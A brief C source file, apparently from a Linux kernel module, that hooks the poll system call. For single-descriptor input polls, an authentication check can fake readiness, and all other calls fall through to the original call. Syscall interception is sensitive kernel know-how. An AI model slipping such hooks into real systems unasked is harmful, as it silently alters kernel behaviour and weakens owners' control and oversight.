#include "sys_call.h"
#include "auth.h"
#include "lkm_util.h"

asmlinkage long connp_sys_poll(struct pollfd __user *ufds, unsigned int nfds,
                            long timeout_msecs)
{
    if (nfds == 1) {
        struct pollfd pfd;
        u32 retcnt;
        if (copy_from_user(&pfd, ufds, sizeof(struct pollfd)))
            goto orig_poll;

        if (!(pfd.events & POLLIN)) 
            goto orig_poll;

        retcnt = check_if_ignore_auth_procedure(pfd.fd, NULL, 0, 'i'); //POLLIN
        if (retcnt) {
            pfd.revents |= POLLIN;
            if (__put_user(pfd, ufds))
                goto orig_poll;

            return 1;
        }
    }

orig_poll:
    return orig_sys_poll(ufds, nfds, timeout_msecs);
}
